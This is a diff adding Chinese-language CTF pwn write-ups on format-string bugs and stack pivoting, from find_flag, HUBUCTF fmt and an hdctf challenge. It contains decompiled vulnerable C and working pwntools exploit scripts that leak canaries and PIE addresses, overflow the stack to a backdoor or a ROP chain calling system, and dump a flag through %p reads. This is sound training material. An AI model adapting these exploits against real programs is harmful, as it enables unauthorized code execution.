@@ -566,3 +566,182 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 然后使用fmt +地址获得偏移量求取
 ![alt text](image-7.png)
 发现是38
+
+
+
+# [深育杯 2021]find_flag
+
+>格式化字符串漏洞
+
+
+```
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+
+```
+```c
+unsigned __int64 sub_132F()
+{
+  char format[32]; // [rsp+0h] [rbp-60h] BYREF
+  char v2[56]; // [rsp+20h] [rbp-40h] BYREF
+  unsigned __int64 v3; // [rsp+58h] [rbp-8h]
+ 
+  v3 = __readfsqword(0x28u);
+  printf("Hi! What's your name? ");
+  gets(format);
+  printf("Nice to meet you, ");
+  strcat(format, "!\n");
+  printf(format);
+  printf("Anything else? ");
+  gets(v2);
+  return __readfsqword(0x28u) ^ v3;
+}
+```
+可以看出来有格式化字符串漏洞，也有栈溢出，但是开了canary保护和pie保护，放进IDAshift+f12看到有后门函数，可以考虑通过字符串漏洞泄漏出canary和一个函数地址，先了解canary，是在rbp前八个字节输入一个字符串，当程序要结束时就比较字符串是否还是之前的那个，pie则是开启随机地址，现在去进行调试，在printf那里打个断点，stack查看
+![alt text](image-8.png)
+可以看到
+0x7fffffffded8 ◂— 0x67109c0ad75a600就是canary
+然后要泄漏基址，可以选择rbp下面一个的地
+0x55555555546f ◂— mov eax, 0，这个地址的内容是对应程序中的某一次 mov eax, 0，有经验的话应该会注意到这些红色的地址只有最后的几位是不一样的，再加上开启了 PIE 导致在 IDA 中看到的地址只有最后四位（也就是实际偏移），那么来验证一下这个猜想，0x*46f 在 IDA 中能不能找到这条指令：
+![alt text](image-10.png)
+![alt text](image-11.png)
+shell的地址是0x1228
+可以用0x146f-0x1228得到这两个中间的偏移量，进行使用
+用fm找到canary和函数的偏移量
+![alt text](image-9.png)
+接下来构造exp：
+```python
+from pwn import *
+context.log_level = 'debug'
+io = remote("node4.anna.nssctf.cn",28116)
+ 
+payload = '%17$p'+'%19$p'
+io.sendlineafter('name? ',payload)
+io.recvuntil('Nice to meet you, ')
+canary = int(io.recv(18),16)
+addr = int(io.recv(14).decode(),16)
+main = 0x146f
+shell = 0x1228
+offset = main-shell
+shelladdr = addr-offset
+ 
+io.recvuntil('Anything else? ')
+payload = b'a'*(0x40-8)+p64(canary)+b'a'*8+p64(shelladdr)
+ 
+io.sendline(payload)
+io.interactive()
+```
+也可以计算基址，构造rop
+```python
+from pwn import *
+context.log_level = 'debug'
+
+local = 1
+if local:
+	p = process('ff')
+else:
+	p = remote('node4.anna.nssctf.cn',28116)
+
+elf = ELF('./ff')
+
+context.log_level = 'debug'
+context(arch='amd64',os='linux')
+
+p.recvuntil(b'name? ')
+payload1 = b'%17$p---%19$p'
+p.sendline(payload1)
+p.recvuntil(b'you, ')
+
+canary = int(p.recv(18), 16)
+print(hex(canary))
+
+p.recvuntil(b'---')
+base = int(p.recv(14), 16)
+print(hex(base))
+
+Base = base - 0x146F
+
+system = Base + elf.sym['system']
+catflag = Base + 0x2004
+#ropgadget
+rdi = Base + 0x14E3
+ret = Base + 0x101A
+
+payload = b'a'*0x38 + p64(canary) + b'a'*8 + p64(ret) + p64(rdi) + p64(catflag) + p64(system)
+p.recvuntil(b'else? ')
+p.sendline(payload)
+p.recv()
+p.interactive()
+```
+
+# [HUBUCTF 2022 新生赛]fmt
+
+字符串倒转：
+大小端序的问题，大端序将数据的低位字节存放在内存的高位地址，高位字节存放在低位地址；
+小端序将一个多位数的低位放在较小的地址处，高位放在较大的地址处。而计算机的内部处理都是小端字节序；在计算机内部，小端序被广泛应用于现代 CPU 内部存储数据；而在其他场景，比如网络传输和文件存储则使用大端序
+
+![alt text](image-12.png)
+上图为小端序的存储状况，作为高位字节的12就放在了低地址
+```bash
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug')
+
+# p = process('./fmt')
+p = remote('node5.anna.nssctf.cn', 28209)
+
+# get flag
+flag_addr = 12
+flag = ''
+while True:
+    p.sendlineafter(b'Echo as a service', '%{}$p'.format(flag_addr))
+    p.recvuntil(b'0x')
+    part = p.recvuntil(b'\n')[:-1]
+    for i in range(0, len(part), 2):
+        index = len(part) - i
+        flag += chr(int(part[index - 2:index].ljust(2, b'0'), 16))
+    print(flag)
+    if '}' in flag:
+        break
+    flag_addr += 1
+
+
+```
+
+
+# hdctf 
+
+>栈迁移 
+
+
+[参考](https://www.uf4te.cn/posts/6f874503.html#%E6%80%9D%E8%B7%AF%E4%BA%8C-%E6%A0%88%E8%BF%81%E7%A7%BB)
+```c
+__int64 vuln()
+{
+  char s[80]; // [rsp+0h] [rbp-50h] BYREF
+
+  memset(s, 0, sizeof(s));
+  puts("please show me your name: ");
+  read(0, s, 0x48uLL);
+  printf("hello,");
+  printf(s);
+  puts("keep on !");
+  read(0, s, 0x60uLL);
+  return 0LL;
+}
+```
+这是主要函数，有格式化漏洞，已有栈溢出，但是栈溢出的位置有限，只能溢出到返回值的位置，这样构造的ROP链不能完全写入到栈上，需要进行栈迁移
+，栈迁移必需得到旧的rbp，
+![alt text](image-13.png)
+泄露出旧的rbp偏移在16，就可以得到旧的rbp地址
+```python
+io.send(b'%16$p')
+io.recvuntil(b'hello')
+pre_rbp = int(io.recv(12),16)
+```
+这里pre_rbp = int(io.recv(12),16)不可以用u64()那一个语句，因为这里我们接收的其实就是一段16进制数据而并不是一串字符序列
